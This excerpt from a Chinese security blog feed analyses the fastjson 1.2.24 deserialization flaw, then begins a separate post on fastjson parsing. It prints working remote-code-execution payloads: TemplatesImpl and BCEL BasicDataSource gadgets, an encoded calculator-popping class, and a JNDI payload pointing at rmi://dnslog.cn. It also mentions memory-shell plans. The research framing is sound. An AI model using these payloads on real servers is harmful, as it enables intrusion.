title="2.2.2 数组类型的变量"></a>2.2.2 数组类型的变量</h4><p>当字段值为数组类型时，使用的是<code>ObjectArrayCodec</code>这个类作为反序列化工具类</p><div align=center><img src="/img/fastjson 1.2.24漏洞分析/14.png" alt="14" style="zoom:50%;" /></div><div align=center><img src="/img/fastjson 1.2.24漏洞分析/15.png" alt="15" style="zoom:50%;" /></div><p><em>base64解码</em></p><div align=center><img src="/img/fastjson 1.2.24漏洞分析/16.png" alt="16" style="zoom:50%;" /></div>通过序列化去写入一个`byte[]`字段值也可以看到<div align=center><img src="/img/fastjson 1.2.24漏洞分析/17.png" alt="17" style="zoom:50%;" /></div>因此这个poc最大的限制在于目标在反序列化时，是否配置允许私有字段的属性，即指定`Feature.SupportNonPublicField` ,如果这项没有指定，那么也就不能使用了；<h4 id="2-2-3-getOutputProperties"><a href="#2-2-3-getOutputProperties" class="headerlink" title="2.2.3 getOutputProperties"></a>2.2.3 getOutputProperties</h4><p>这里再提一下，这个poc的触发点，是这个方法；在之前分析fastjson反序列化流程时，对于getXXX方法也是会提取的，前提是getXXX的方法是没有传参的；</p><h4 id="2-2-4-结合CB利用链的新思路"><a href="#2-2-4-结合CB利用链的新思路" class="headerlink" title="2.2.4 结合CB利用链的新思路"></a>2.2.4 结合CB利用链的新思路</h4><p>记录一个思路： {“@type”:”org.apache.commons.beanutils.BeanComparator”,”comparator”:{“@type”:”org.apache.commons.collections.comparators.ComparableComparator”},”property”:”outputProperties”}<br>通过<code>TreeSet</code>触发反序列化，这个看看后续能不能用</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="attr">&quot;_bytecodes&quot;</span>:[<span class="string">&quot;xxxxxxx&quot;</span>],<span class="attr">&quot;_name&quot;</span>:<span class="string">&quot;a.b&quot;</span>,<span class="attr">&quot;_tfactory&quot;</span>:&#123;&#125;,<span class="attr">&quot;_outputProperties&quot;</span>:&#123; &#125;,<span class="attr">&quot;_version&quot;</span>:<span class="string">&quot;1.0&quot;</span>,<span class="attr">&quot;allowedProtocols&quot;</span>:<span class="string">&quot;all&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="attr">&quot;_bytecodes&quot;</span>: <span class="string">&quot;xxxxxxx&quot;</span>,<span class="attr">&quot;_name&quot;</span>:<span class="string">&quot;p&quot;</span>,<span class="attr">&quot;_tfactory&quot;</span>:&#123;&#125;,<span class="attr">&quot;_outputProperties&quot;</span>:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>这里类加载的部分就不说了，参考之前反序列化中分析<code>TemplatesImpl</code>的步骤，这里触发类的实例化的地方在<code>getOutputProperties()</code></li></ul><h3 id="2-3-BCEL利用链"><a href="#2-3-BCEL利用链" class="headerlink" title="2.3 BCEL利用链"></a>2.3 BCEL利用链</h3><h4 id="2-3-1-BasicDataSource关键类"><a href="#2-3-1-BasicDataSource关键类" class="headerlink" title="2.3.1 BasicDataSource关键类"></a>2.3.1 BasicDataSource关键类</h4><p>关键类：<code>org.apache.tomcat.dbcp.dbcp.BasicDataSource</code><br>如图，在createConnectionFactory方法调用了<code>Class.forName</code>，其中<code>driverClassName</code>和<code>driverClassLoader</code>两个私有参数都有对应的Set方法，因此是可控的</p><div align=center><img src="/img/fastjson 1.2.24漏洞分析/18.png" alt="18" style="zoom:50%;" /></div><ul><li>追踪一下<code>createConnectionFactory</code> 的调用链   </li></ul><div align=center><img src="/img/fastjson 1.2.24漏洞分析/e.png" alt="e" style="zoom:50%;" /></div><p><strong>此时出现一个问题</strong>：</p><p>反序列化类的<code>get</code>方法的调用问题，之前的分析流程中<code>getXXX</code>方法会被提取，其中<code>FieldInfo</code>中<code>propertyName</code>是分割<code>getXXX</code>而来，因此不需要必须有对应的字段；<br>但是直接使用<code>JSON.parse(String str)</code>反序列化中，会对getXXX的返回值进行判断，返回类型只能为<code>Collection</code>、<code>Map</code>、<code>AtomicBoolean</code>、<code>AtomicInteger</code>、<code>AtomicLong</code>这几个类型；而<code>BasicDataSource#getConnection</code>的返回类型是<code>Connction</code>，因此不满足使用条件</p><div align=center><img src="/img/fastjson 1.2.24漏洞分析/19.png" alt="19" style="zoom:50%;" /></div>#### 2.3.2 JSON.parseObject()解决上面问题的办法，也有，网上公开的即在示例代码中将`JSON.parse()`修改为`JSON.parseObject()`，此时触发了代码；但是并不能保证目标都是使用`parseObject`方法去解析<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String str = <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;       \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;       \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;             \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;       &#125;,\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;       \&quot;driverClassName\&quot;: \&quot;&quot;</span>+bcel+<span class="string">&quot;\&quot;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;      &#125;&quot;</span>;</span><br><span class="line">System.out.println(str);</span><br><span class="line">JSON.parseObject(str);</span><br></pre></td></tr></table></figure>##### 2.3.2.1 JSON.toJSON(obj)<ol><li>调试parseObject，如图，parse是一个正常的反序列化解析，后面返回一个<code>JSON.toJSON(obj);</code></li></ol><div align=center><img src="/img/fastjson 1.2.24漏洞分析/20.png" alt="20" style="zoom:50%;" /></div>##### 2.3.2.2 createJavaBeanSerializer和createASMSerializer中创建sortedGetters<ol start="2"><li>进入toJSON方法，执行流程 <code>config.getObjectWriter(clazz)</code> -&gt; <code>createJavaBeanSerializer(clazz)</code></li></ol><div align=center><img src="/img/fastjson 1.2.24漏洞分析/21.png" alt="21" style="zoom:50%;" /></div><div align=center><img src="/img/fastjson 1.2.24漏洞分析/22.png" alt="22" style="zoom:50%;" /></div><ol start="3"><li>在<code>createJavaBeanSerializer</code> 中关注一下<code>TypeUtils.buildBeanInfo(clazz, null, propertyNamingStrategy);</code>，这里分析这个位置的原因是，从后面的触发点来看，是取的<code>beanInfo</code>中的<code>sortedGetters</code>中的<code>FieldInfo</code>进行操作，因此先看看这些<code>get</code>方法什么时候被取到的</li></ol><div align=center><img src="/img/fastjson 1.2.24漏洞分析/23.png" alt="23" style="zoom:50%;" /></div><ol start="4"><li>可以看到，这里的<code>computeGetters(beanType, jsonType, aliasMap, fieldCacheMap, false, propertyNamingStrategy);</code></li></ol><p>不管从方法名上还是调试中，都是和获取<code>get</code>相关方法的<code>FieldInfo</code>相关</p><div align=center><img src="/img/fastjson 1.2.24漏洞分析/24.png" alt="24" style="zoom:50%;" /></div><ol start="5"><li>如图获取了所有的方法，并对方法名进行判断，其中包括一个条件即<code>getXXX</code>的方法，最终构造一个<code>FieldInfo</code>，存入<code>fieldInfoMap</code>中并遍历到<code>fieldInfoList</code>中返回</li></ol><div align=center><img src="/img/fastjson 1.2.24漏洞分析/25.png" alt="25" style="zoom:50%;" /></div><ol start="6"><li>最终<code>buildBeanInfo</code>返回一个<code>SerializeBeanInfo</code>的<code>BeanInfo</code>对象</li></ol><div align=center><img src="/img/fastjson 1.2.24漏洞分析/26.png" alt="26" style="zoom:50%;" /></div><ol start="7"><li>接下来，在<code>createASMSerializer</code>时，判断接口字段信息是否有field为空、方法不为空，且方法不是实现的接口中的方法时，又进入了new JavaBeanSerializer(clazz)中；</li></ol><div align=center><img src="/img/fastjson 1.2.24漏洞分析/27.png" alt="27" style="zoom:50%;" /></div><div align=center><img src="/img/fastjson 1.2.24漏洞分析/28.png" alt="28" style="zoom:50%;" /></div><ol start="8"><li>完成实例化<code>JavaBeanSerializer</code>后，返回<code>serializer</code></li></ol><div align=center><img src="/img/fastjson 1.2.24漏洞分析/29.png" alt="29" style="zoom:50%;" /></div>##### 2.3.2.3 FieldInfo.get()方法触发invoke执行<ol start="9"><li>一路返回，到第二步，这里将sortedGetters中的FieldInfo，放到Map中，即图中的values</li></ol><div align=center><img src="/img/fastjson 1.2.24漏洞分析/30.png" alt="30" style="zoom:50%;" /></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title">getFieldValuesMap</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Map&lt;String, Object&gt; map = <span class="keyword">new</span> LinkedHashMap&lt;String, Object&gt;(sortedGetters.length);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (FieldSerializer getter : sortedGetters) &#123;</span><br><span class="line">        map.put(getter.fieldInfo.name, getter.getPropertyValue(object));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div align=center><img src="/img/fastjson 1.2.24漏洞分析/31.png" alt="31" style="zoom:50%;" /></div><div align=center><img src="/img/fastjson 1.2.24漏洞分析/32.png" alt="32" style="zoom:50%;" /></div>进入`FieldInfo.get`方法，这里执行了`invoke`，触发了`getConnection()`方法的调用；也就触发了`org.apache.tomcat.dbcp.dbcp.BasicDataSource#createConnectionFactory`，导致了恶意类加载<div align=center><img src="/img/fastjson 1.2.24漏洞分析/33.png" alt="33" style="zoom:50%;" /></div><h4 id="2-3-3-如何使用JSON-parse-触发"><a href="#2-3-3-如何使用JSON-parse-触发" class="headerlink" title="2.3.3 如何使用JSON.parse()触发"></a>2.3.3 如何使用JSON.parse()触发</h4><p><em>实际场景中，目标不一定使用</em><code>_JSON.parseObject(String str)_</code><em>进行解析</em></p><h5 id="2-3-3-1-Type为JSONObject类时"><a href="#2-3-3-1-Type为JSONObject类时" class="headerlink" title="2.3.3.1 @Type为JSONObject类时"></a>2.3.3.1 @Type为JSONObject类时</h5><p>如图的解析流程中，当<code>@type</code>类型是<code>JSONObject.class</code>时，会调用<code>key.toString()</code>方法</p><div align=center><img src="/img/fastjson 1.2.24漏洞分析/34.png" alt="34" style="zoom:50%;" /></div><h5 id="2-3-3-2-执行到key-toString-方法"><a href="#2-3-3-2-执行到key-toString-方法" class="headerlink" title="2.3.3.2 执行到key.toString()方法"></a>2.3.3.2 执行到key.toString()方法</h5><p>当<code>JSONObject</code>这个类标签解析完成后，执行到<code>key.toString()</code>方法</p><div align=center><img src="/img/fastjson 1.2.24漏洞分析/35.png" alt="35" style="zoom:50%;" /></div>执行到`JSON#toJSONString()`方法；进入`new JSONSerializer(out).write(this)`方法<div align=center><img src="/img/fastjson 1.2.24漏洞分析/36.png" alt="36" style="zoom:50%;" /></div><h5 id="2-3-3-3-触发invoke"><a href="#2-3-3-3-触发invoke" class="headerlink" title="2.3.3.3 触发invoke"></a>2.3.3.3 触发invoke</h5><div align=center><img src="/img/fastjson 1.2.24漏洞分析/37.png" alt="37" style="zoom:50%;" /></div>这里看到`getObjectWriter`，就和**2.3.2.2 **类似了；进入`preWriter.writer`方法，跟踪到`propertyValue = fieldSerializer.getPropertyValueDirect(object);`<div align=center><img src="/img/fastjson 1.2.24漏洞分析/38.png" alt="38" style="zoom:50%;" /></div>和**2.3.2.3**一样的触发invoke执行代码<div align=center><img src="/img/fastjson 1.2.24漏洞分析/39.png" alt="39" style="zoom:50%;" /></div><h5 id="2-3-3-4-poc构造"><a href="#2-3-3-4-poc构造" class="headerlink" title="2.3.3.4 poc构造"></a>2.3.3.4 poc构造</h5><p>poc如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">  &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">  &quot;x&quot;:&#123;</span><br><span class="line">    &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">    &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">      &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;driverClassName&quot;: &quot;BCELPayload&quot;</span><br><span class="line">  &#125;: &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而实际上在最开始的<code>parse()</code>方法中，进入parseObject之前，传入的object就是JSONObject类，因此不需要带上 <code>&quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;</code></p><div align=center><img src="/img/fastjson 1.2.24漏洞分析/40.png" alt="40" style="zoom:50%;" /></div><p>这样便带来一个疑问，<code>@type</code>字段的解析和不带<code>@type</code>的解析有什么区别<br>如图，传入的object类型是个Map类型，查看一下<code>JSONObject</code>类，确实implements <code>Map</code>接口</p><div align=center><img src="/img/fastjson 1.2.24漏洞分析/41.png" alt="41" style="zoom:50%;" /></div><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">## tomcat6、7</span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;x&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">      &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;driverClassName&quot;: &quot;BCELPayload&quot;</span><br><span class="line">    &#125;: &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">## &gt; tomcat8</span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;x&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br><span class="line">      &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;driverClassName&quot;: &quot;BCELPayload&quot;</span><br><span class="line">    &#125;: &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--&lt;= tomcat7.x--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- tomcat6.x的依赖包路径：org.apache.tomcat dbcp 版本号--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.0.100<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&gt;= tomcat8.x--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>#### 2.3.4 回显和内存马EXP首先可以确定的是，能用这个利用链肯定有tomcat的dbcp包，所以构造一下tomcat的回显和内存马即可<h5 id="2-3-4-1-恶意代码块位置"><a href="#2-3-4-1-恶意代码块位置" class="headerlink" title="2.3.4.1 恶意代码块位置"></a>2.3.4.1 恶意代码块位置</h5><p>之前在构造shiro反序列化的时候，会将代码都放到默认构造方法中，因为最终会生成实例化对象，但是这里只是<code>Class.forName(String name)</code>，查看这个方法，实际上默认执行Class.forName(String name) 相当于</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(String name, <span class="keyword">true</span>, ClassLoader.getClassLoader(Reflection.getCallerClass()))</span><br></pre></td></tr></table></figure><p>因此会执行<code>static</code>中的代码块</p><div align=center><img src="/img/fastjson 1.2.24漏洞分析/42.png" alt="42" style="zoom:50%;" /></div>使用案例测试一下<div align=center><img src="/img/fastjson 1.2.24漏洞分析/43.png" alt="43" style="zoom:50%;" /></div><h5 id="2-3-4-2-弹出计算器"><a href="#2-3-4-2-弹出计算器" class="headerlink" title="2.3.4.2 弹出计算器"></a>2.3.4.2 弹出计算器</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line">        <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,                </span><br><span class="line">            <span class="string">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>               </span><br><span class="line">                        &#125;,</span><br><span class="line">                <span class="string">&quot;driverClassName&quot;</span>: <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$Ae$90$cdJ$c3$40$U$85$cfm$da$s$c6$d6$feh$fd$5b$v$I$a6$$$9a$85$cb$W$a1$U$5c$v$8a$R$5dO$c7$a1LM$93$90LE$9f$c8u7$w$$$7c$A$lJ$bc$J$F$L$O3s$b8$973$df$e1$ce$f7$cf$e7$X$80S$ec$Thh$83$I$cd$a9x$S$7e$u$a2$89$7f5$9e$wilX$E7$88$e7$a9T$e7$3aT$84$ea$b0$97$9b$I$ce$40$86$3a$d2$e6$8c$60y$dd$3bBy$U$3f$b0$a1$f5$c7$b8$99GF$cf$94$N$97$n$Te$965$a1$e3u$_$fe$d9$fa5$d4Pw$b1$8e$N$82$X$t$w$3a$f0$83$97$cc$a8$99$3fL$92PKat$ie$feH$84r$k$K$T$a7$3d$91$q$O$9a$i$ad$9e$95$q$i$7b$x$d4$c0$a4$3a$9a$f4W$83$ae$d3X$aa$y$e3$a066$f3$a0$zB$3d0B$3e$5e$8a$e4V$8c$8b$f9$G$c5P5$ec$c0qQ$c6$$$OQb$cdW$J$Ol$3e$845$ae$8e$60q$Hh$bc$f2$t$5d$7c$a0$d1n$bd$a1s$bf$e0$Wa$9bo$L$c4$3b$H$z_$b4X$89$b5r$f2$8e$bdE$81$qT$Kp$f5$X$Rg$_$92$8e$B$A$A&quot;</span>        &#125;</span><br><span class="line">    &#125;: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div align=center><img src="/img/fastjson 1.2.24漏洞分析/44.png" alt="44" style="zoom:50%;" /></div><h5 id="2-3-4-3-回显"><a href="#2-3-4-3-回显" class="headerlink" title="2.3.4.3 回显"></a>2.3.4.3 回显</h5><div align=center><img src="/img/fastjson 1.2.24漏洞分析/45.png" alt="45" style="zoom:50%;" /></div><h5 id="2-3-4-4-内存马"><a href="#2-3-4-4-内存马" class="headerlink" title="2.3.4.4 内存马"></a>2.3.4.4 内存马</h5><p>还未构造，和<code>Tomcat</code>一样</p><h3 id="2-4-JdbcRowSetImpl利用链"><a href="#2-4-JdbcRowSetImpl利用链" class="headerlink" title="2.4 JdbcRowSetImpl利用链"></a>2.4 JdbcRowSetImpl利用链</h3><h4 id="2-4-1-JNDI调用"><a href="#2-4-1-JNDI调用" class="headerlink" title="2.4.1 JNDI调用"></a>2.4.1 JNDI调用</h4><p>如图<code>JdbcRowSetImpl#connect</code>中触发<code>JNDI</code>请求，<code>dataSourceName</code>是参数</p><div align=center><img src="/img/fastjson 1.2.24漏洞分析/46.png" alt="46" style="zoom:50%;" /></div><h4 id="2-4-2-触发链setAutoCommit"><a href="#2-4-2-触发链setAutoCommit" class="headerlink" title="2.4.2 触发链setAutoCommit"></a>2.4.2 触发链setAutoCommit</h4><div align=center><img src="/img/fastjson 1.2.24漏洞分析/47.png" alt="47" style="zoom:50%;" /></div><h4 id="2-4-3-Poc"><a href="#2-4-3-Poc" class="headerlink" title="2.4.3 Poc"></a>2.4.3 Poc</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span>: <span class="string">&quot;rmi://dnslog.cn&quot;</span>,</span><br><span class="line">    &quot;autoCommit&quot; true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 攻防研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson序列化和反序列化</title>
      <link href="/2022/11/11/fastjson%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/11/11/fastjson%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="1-对象和Json字符串之间的转换"><a href="#1-对象和Json字符串之间的转换" class="headerlink" title="1. 对象和Json字符串之间的转换"></a>1. 对象和Json字符串之间的转换</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> example;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">doJson</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> String <span class="title">Object2Json</span><span class="params">(Object obj, SerializerFeature serializerFeature)</span></span>&#123;</span><br><span class="line">        String jsonStr = JSON.toJSONString(obj, serializerFeature);</span><br><span class="line">        <span class="keyword">return</span> jsonStr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> Object <span class="title">Json2Object</span><span class="params">(String jsonStr)</span></span>&#123;</span><br><span class="line">        Object o = JSON.parse(jsonStr);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        String str = Object2Json(user, SerializerFeature.WriteNullNumberAsZero);</span><br><span class="line">        System.out.println(<span class="string">&quot;User对象没有赋值转换为Json字符串：&quot;</span>);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">        System.out.println(JSON.toJSONString(user));</span><br><span class="line">        user.setName(<span class="string">&quot;Lion&quot;</span>);</span><br><span class="line">        user.setAge(<span class="number">18</span>);</span><br><span class="line">        user.setSchool(<span class="string">&quot;qinghua&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;User对象字段赋值后转换为Json字符串：&quot;</span>);</span><br><span class="line">        System.out.println(Object2Json(user, SerializerFeature.WriteNullNumberAsZero));</span><br><span class="line">        System.out.println(<span class="string">&quot;指定类后转换为Json字符串&quot;</span>);</span><br><span class="line">        System.out.println(Object2Json(user, SerializerFeature.WriteClassName));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/img/fastjson序列化和反序列化/1.png" alt="1" style="zoom:50%;" /><img src="/img/fastjson序列化和反序列化/2.png" alt="2" style="zoom:50%;" /><h2 id="2-反序列化解析流程"><a href="#2-反序列化解析流程" class="headerlink" title="2. 反序列化解析流程"></a>2. 反序列化解析流程</h2><blockquote><p>这里主要看一下字符串转成Object的解析流程</p></blockquote><h3 id="2-1-创建JSON解析器"><a href="#2-1-创建JSON解析器" class="headerlink" title="2.1 创建JSON解析器"></a>2.1 创建JSON解析器</h3><p>com.alibaba.fastjson.parse</p><ol><li>创建默认的JSON解析器，默认的全局配置中有DenyList，1.2.24版本上只有两个Thread类</li></ol><img src="/img/fastjson序列化和反序列化/3.png" alt="3" style="zoom:50%;" /><ol start="2"><li>创建新的Json解析器中，跟入<code>new JSONScanner(intput, features)</code></li></ol><img src="/img/fastjson序列化和反序列化/4.png" alt="4" style="zoom:50%;" /><ol start="3"><li>进入<code>JSONScanner</code>的构造方法，这里去了字符串的第一个字符，如<code>&#123;</code>，判断了是否为<code>\ufeff</code>（Byte Order Mark，字节顺序标记，出现在文本文件头部，Unicode编码标准中用于标识文件是采用哪种格式的编码）</li></ol><img src="/img/fastjson序列化和反序列化/5.png" alt="5" style="zoom:50%;" /><ol start="4"><li>进入<code>DefaultJSONParser</code>构造方法</li></ol><p>可以看到判断第一个字符是否为<code>&#123;</code>如果是则取下一个字符，下面有个判断是否为<code>[</code>的，这个可以留着再分析 ，此时的token被指定为12</p><div align=center><img src="/img/fastjson序列化和反序列化/6.png" alt="6" style="zoom:50%;" /></div><h3 id="2-2-解析器工作"><a href="#2-2-解析器工作" class="headerlink" title="2.2 解析器工作"></a>2.2 解析器工作</h3><ul><li>parse.parse()解析</li></ul><p>回到步骤1，进入<code>parse.parse();</code>首先判断Token是否正常，<code>1,5,10,11,13,15,16,17,18,19</code>都会抛出异常，这里感觉有很多的case分支，不知道的干什么的，也可以留下来</p><div align=center><img src="/img/fastjson序列化和反序列化/7.png" alt="7" style="zoom:50%;" /></div><div align=center><img src="/img/fastjson序列化和反序列化/8.png" alt="7" style="zoom:50%;" /></div><ol start="6"><li>进入<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject</code></li></ol><div align=center><img src="/img/fastjson序列化和反序列化/9.png" alt="9" style="zoom:50%;" /></div><p>第一步跳过空白字符，跟入方法看见 首先判断ch是否<code>&lt;=&#39;/&#39;</code>，然后<code> 